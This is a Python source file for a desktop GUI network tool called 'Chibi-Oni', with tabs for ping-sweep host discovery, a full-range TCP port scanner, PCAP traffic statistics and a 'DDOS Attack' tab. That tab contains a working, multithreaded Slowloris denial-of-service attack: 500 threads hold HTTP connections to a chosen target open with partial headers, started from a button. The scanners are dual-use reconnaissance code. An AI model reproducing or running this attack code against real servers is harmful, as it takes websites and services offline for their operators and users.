import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import customtkinter as ctk
import ipaddress
import subprocess
from concurrent.futures import ThreadPoolExecutor
import socket
import random
import time
import threading
from getmac import get_mac_address
from queue import Queue
import scapy.all as scapy

# Variables to manage attack threads
attack_threads = []
stop_attack_event = threading.Event()

def ping_host(ip_str):
    """Pings a single host and returns True if reachable, False otherwise."""
    result = subprocess.run(['ping', '-n', '1', '-w', '500', ip_str], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    return result.returncode == 0

def perform_host_discovery():
    target_range = host_discovery_target_entry.get()

    # Error handling (check for valid target range)
    if not target_range:
        host_discovery_output_text_box.insert(tk.END, "Error: Please enter a target range.\n")
        return

    # Validate IP range
    try:
        network = ipaddress.ip_network(target_range, strict=False)
    except ValueError as e:
        host_discovery_output_text_box.insert(tk.END, f"Error: {str(e)}\n")
        return

    # Clear previous results and add waiting message
    host_discovery_output_text_box.delete("1.0", tk.END)
    host_discovery_output_text_box.insert(tk.END, "Please wait while scanning...\n")
    host_discovery_output_text_box.update()

    # Perform host discovery using multithreading
    with ThreadPoolExecutor() as executor:
        reachable_ips = executor.map(ping_host, [str(ip) for ip in network.hosts()])

    host_discovery_output_text_box.delete("1.0", tk.END)
    host_discovery_output_text_box.insert(tk.END, f"Starting scan for: {target_range}\n")
    for ip, reachable in zip(network.hosts(), reachable_ips):
        if reachable:
            mac_address = get_mac_address(ip=str(ip))
            host_discovery_output_text_box.insert(tk.END, f"Host {str(ip)} is up.\t mac address: {mac_address}\n")

    host_discovery_output_text_box.insert(tk.END, "Host discovery completed.\n")

def port_scanner(target_ip, port, results):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)  # Set a timeout for faster scanning
        result = s.connect_ex((target_ip, port))
        if result == 0:
            results.append(port)
        s.close()
    except socket.gaierror:
        results.append(f"\nHostname Could Not Be Resolved!\n")
    except socket.error:
        pass  # Ignore errors like "Connection refused"

def perform_port_scan():
    target_host = port_scan_target_entry.get()
    mac_address = get_mac_address(ip=str(target_host))

    # Error handling (check for valid target)
    if not target_host:
        port_scan_output_text_box.insert(tk.END, "Error: Please enter a target host.\n")
        return

    # Clear previous results and add waiting message
    port_scan_output_text_box.delete("1.0", tk.END)
    port_scan_output_text_box.insert(tk.END, "Please wait while scanning...\n")
    port_scan_output_text_box.update()

    threads = []
    open_ports = []

    # Scan a predefined range of ports (can be adjusted)
    for port in range(1, 65535):  # Scan all 65353 ports 
        thread = threading.Thread(target=port_scanner, args=(target_host, port, open_ports))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    # Display results
    port_scan_output_text_box.delete("1.0", tk.END)
    port_scan_output_text_box.insert(tk.END, f"Scan Results for: {target_host}\t\t mac address: {mac_address}\n\n")
    if open_ports:
        for port in open_ports:
            port_scan_output_text_box.insert(tk.END, f"Port {port} is open\n")
    else:
        port_scan_output_text_box.insert(tk.END, "No open ports found.\n")

    port_scan_output_text_box.insert(tk.END, "Scan completed!\n")

def analyze_traffic(pcap_file, top_n=10):
    """Analyzes network traffic from a PCAP file and identifies heavily accessed hosts."""
    host_access_count = {}
    # destination_ip_count = {}

    try:
        # Clear previous results and add analyzing message
        network_statistics_output_text_box.delete("1.0", tk.END)
        network_statistics_output_text_box.insert(tk.END, "Analyzing the network...\n")
        network_statistics_output_text_box.update()

        packets = scapy.rdpcap(pcap_file)

        for packet in packets:
            if packet.haslayer(scapy.IP):
                src_ip = packet[scapy.IP].src

                if src_ip not in host_access_count:
                    host_access_count[src_ip] = 0
                host_access_count[src_ip] += 1

        top_n_accessed_hosts = sorted(host_access_count.items(), key=lambda x: x[1], reverse=True)[:top_n]

        result = f"Top {top_n} Most Accessed Hosts:\n"
        for host, count in top_n_accessed_hosts:
            result += f"{host} : {count} accesses\n"


        network_statistics_output_text_box.delete("1.0", tk.END)
        network_statistics_output_text_box.insert(tk.END, result)
    except FileNotFoundError:
        messagebox.showerror("Error", f"The file {pcap_file} was not found.")
    except scapy.Scapy_Exception as e:
        messagebox.showerror("Scapy Error", str(e))

def select_file():
    """Opens a file dialog to select a PCAP file."""
    pcap_file = filedialog.askopenfilename(filetypes=[("PCAP files", "*.pcap"), ("All files", "*.*")])
    if pcap_file:
        top_n = int(top_n_entry.get())
        analyze_traffic(pcap_file, top_n)

def slowloris_attack(target_host, target_port):
    num_threads = 500
    thread_pool = Queue()

    def attack():
        while not stop_attack_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)  # Set timeout for connection attempts
                s.connect((target_host, target_port))
                s.send(b'GET / HTTP/1.1\r\n')
                s.send(b'Host: ' + target_host.encode() + b'\r\n')
                s.send(b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\r\n')
                s.send(b'Accept: */*\r\n')
                s.send(b'Accept-Language: en-US,en;q=0.9\r\n')
                s.send(b'Connection: keep-alive\r\n')
                s.send(b'\r\n')
                while not stop_attack_event.is_set():
                    try:
                        s.send(b'X-a: ' + str(random.randint(1, 5000)).encode() + b'\r\n')
                        time.sleep(1)
                    except socket.error:
                        break
            except socket.error as e:
                print(f"Connection error: {e}")
                ddos_output_text_box.insert(tk.END, f"Connection error: {e}\n")
                stop_attack_event.set()  # Signal to stop the attack
                break
            finally:
                s.close()

    def thread_worker():
        while not stop_attack_event.is_set():
            attack()
            thread_pool.task_done()

    # Create and start threads
    for _ in range(num_threads):
        thread = threading.Thread(target=thread_worker)
        thread.daemon = True
        thread_pool.put(thread)
        thread.start()
        attack_threads.append(thread)

    thread_pool.join()

def start_ddos_attack():
    global stop_attack_event
    stop_attack_event.clear()

    target_host = ddos_target_entry.get()
    target_port = int(ddos_port_entry.get())
    selected_attack = attack_type_var.get()

    # Clear previous results and add waiting message
    ddos_output_text_box.delete("1.0", tk.END)
    ddos_output_text_box.insert(tk.END, "Please wait while starting the attack...\n")
    ddos_output_text_box.update()

    if selected_attack == "Slowloris":
        threading.Thread(target=slowloris_attack, args=(target_host, target_port)).start()

    ddos_output_text_box.insert(tk.END, "Attack started!\n")

def stop_ddos_attack():
    global stop_attack_event
    stop_attack_event.set()

    # Wait for threads to stop, excluding the current thread
    current_thread = threading.current_thread()
    for thread in attack_threads:
        if thread is not current_thread:
            thread.join()

    ddos_output_text_box.insert(tk.END, "Attack stopped!\n")


# Create the main window
window = ctk.CTk()
window.geometry("800x600")
window.title("Chibi-Oni")
window.iconbitmap("icon.ico")

# Create a notebook (tab container)
notebook = ttk.Notebook(window)
notebook.pack(expand=True, fill="both")

# Create the Host Discovery tab
host_discovery_tab = ttk.Frame(notebook)
notebook.add(host_discovery_tab, text="Host Discovery")

# Create the Port Scanning tab
port_scan_tab = ttk.Frame(notebook)
notebook.add(port_scan_tab, text="Port Scanning")

# Create the Network Statistics tab
network_statistics_tab = ttk.Frame(notebook)
notebook.add(network_statistics_tab, text="Network Statistics")

# Create the DDOS Attack tab
ddos_attack_tab = ttk.Frame(notebook)
notebook.add(ddos_attack_tab, text="DDOS Attack")

# Apply styles
style = ttk.Style()
style.configure('TNotebook.Tab', font=('Helvetica', 10, 'bold'), padding=[8, 8], background='#FFFFFF', foreground='#2E2E2E')
style.map('TNotebook.Tab', background=[('selected', '#FFFFFF')], foreground=[('selected', '#1E1E1E')])
style.configure('TFrame', background='#1E1E1E')
style.configure('TLabel', background='#1E1E1E', foreground='#FFFFFF', font=('Helvetica', 12))
style.configure('TEntry', font=('Helvetica', 12))
style.configure('TButton', font=('Helvetica', 12), padding=[10, 10], background='#2E2E2E', foreground='#FFFFFF')

# Host Discovery tab content
host_discovery_label = ctk.CTkLabel(master=host_discovery_tab, text="Target Range (CIDR):")
host_discovery_label.pack(pady=10)

host_discovery_target_entry = ctk.CTkEntry(master=host_discovery_tab, width=200)
host_discovery_target_entry.pack(pady=5)

start_host_discovery_button = ctk.CTkButton(master=host_discovery_tab, text="Start Host Discovery", command=perform_host_discovery)
start_host_discovery_button.pack(pady=10)

host_discovery_output_frame = ctk.CTkFrame(master=host_discovery_tab)
host_discovery_output_frame.pack(expand=True, fill="both", padx=10, pady=10)

host_discovery_output_text_box = ctk.CTkTextbox(master=host_discovery_output_frame, height=20, width=600)
host_discovery_output_text_box.pack(side="left", fill="both", expand=True)

host_discovery_scrollbar = ctk.CTkScrollbar(master=host_discovery_output_frame, command=host_discovery_output_text_box.yview)
host_discovery_scrollbar.pack(side="right", fill="y")
host_discovery_output_text_box.configure(yscrollcommand=host_discovery_scrollbar.set)

# Port Scanning tab content
port_scan_label = ctk.CTkLabel(master=port_scan_tab, text="Target Host:")
port_scan_label.pack(pady=10)

port_scan_target_entry = ctk.CTkEntry(master=port_scan_tab, width=200)
port_scan_target_entry.pack(pady=5)

start_port_scan_button = ctk.CTkButton(master=port_scan_tab, text="Start Port Scan", command=perform_port_scan)
start_port_scan_button.pack(pady=10)

port_scan_output_frame = ctk.CTkFrame(master=port_scan_tab)
port_scan_output_frame.pack(expand=True, fill="both", padx=10, pady=10)

port_scan_output_text_box = ctk.CTkTextbox(master=port_scan_output_frame, height=20, width=600)
port_scan_output_text_box.pack(side="left", fill="both", expand=True)

port_scan_scrollbar = ctk.CTkScrollbar(master=port_scan_output_frame, command=port_scan_output_text_box.yview)
port_scan_scrollbar.pack(side="right", fill="y")

port_scan_output_text_box.configure(yscrollcommand=port_scan_scrollbar.set)

# Network Statistics tab content
network_statistics_label = ctk.CTkLabel(master=network_statistics_tab, text="Number of top accessed hosts to display:")
network_statistics_label.pack(pady=10)

top_n_entry = ctk.CTkEntry(master=network_statistics_tab, width=50)
top_n_entry.insert(0, "10")
top_n_entry.pack(pady=5)

network_statistics_button = ctk.CTkButton(master=network_statistics_tab, text="Select PCAP File", command=select_file)
network_statistics_button.pack(pady=10)

network_statistics_output_frame = ctk.CTkFrame(master=network_statistics_tab)
network_statistics_output_frame.pack(expand=True, fill="both", padx=10, pady=10)

network_statistics_output_text_box = ctk.CTkTextbox(master=network_statistics_output_frame, height=20, width=600)
network_statistics_output_text_box.pack(side="left", fill="both", expand=True)

network_statistics_scrollbar = ctk.CTkScrollbar(master=network_statistics_output_frame, command=network_statistics_output_text_box.yview)
network_statistics_scrollbar.pack(side="right", fill="y")

network_statistics_output_text_box.configure(yscrollcommand=network_statistics_scrollbar.set)

# DDOS Attack tab content
ddos_target_label = ctk.CTkLabel(master=ddos_attack_tab, text="Target Address:")
ddos_target_label.pack(pady=10)

ddos_target_entry = ctk.CTkEntry(master=ddos_attack_tab, width=200)
ddos_target_entry.pack(pady=5)

ddos_port_label = ctk.CTkLabel(master=ddos_attack_tab, text="Target Port:")
ddos_port_label.pack(pady=10)

ddos_port_entry = ctk.CTkEntry(master=ddos_attack_tab, width=200)
ddos_port_entry.pack(pady=5)
ddos_port_entry.insert(0, "80")  # Default port 80

attack_type_var = tk.StringVar(value="Slowloris")

slowloris_radio_button = ctk.CTkRadioButton(master=ddos_attack_tab, text="Slowloris Attack", variable=attack_type_var, value="Slowloris")
slowloris_radio_button.pack(pady=5)

start_ddos_attack_button = ctk.CTkButton(master=ddos_attack_tab, text="Start Attack", command=start_ddos_attack)
start_ddos_attack_button.pack(pady=10)

stop_ddos_attack_button = ctk.CTkButton(master=ddos_attack_tab, text="Stop Attack", command=stop_ddos_attack)
stop_ddos_attack_button.pack(pady=10)

ddos_output_frame = ctk.CTkFrame(master=ddos_attack_tab)
ddos_output_frame.pack(expand=True, fill="both", padx=10, pady=10)

ddos_output_text_box = ctk.CTkTextbox(master=ddos_output_frame, height=20, width=600)
ddos_output_text_box.pack(side="left", fill="both", expand=True)

ddos_scrollbar = ttk.Scrollbar(master=ddos_output_frame, orient="vertical", command=ddos_output_text_box.yview)
ddos_scrollbar.pack(side="right", fill="y")
ddos_output_text_box.configure(yscrollcommand=ddos_scrollbar.set)

# Display descriptions for attack types in the output box initially
ddos_output_text_box.insert(tk.END, "Slowloris Attack: A type of Denial-of-Service (DoS) attack that sends partial HTTP requests to keep many connections to the target web server open and hold them open as long as possible.\n\n")

# Run the Tkinter event loop
window.mainloop()
